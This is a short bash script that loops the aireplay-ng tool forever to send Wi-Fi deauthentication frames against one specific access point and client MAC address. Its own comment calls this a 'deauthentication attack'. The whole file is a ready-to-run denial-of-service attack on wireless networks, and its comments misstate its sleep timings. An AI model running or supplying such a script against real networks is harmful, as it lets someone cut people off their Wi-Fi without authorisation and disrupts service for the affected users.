#!/bin/bash

COUNTER=1
CLIENT1="00:27:15:19:43:8E"

function killer(){
	#sleep every 30 secont after send 100 deauthentication attack
	sudo aireplay-ng -a 74:B5:7E:B1:4C:D6 -c 78:02:F8:7A:E8:AF -0 5  wlan1 && echo "sleep 60 seconds"
	sleep 20
}

while ((1)); do

	echo -e "KILLER "$COUNTER" START !!!\n\n"
	((COUNTER++))
	killer
done


echo -e "SOMETHING WRONG !!!\n\n"
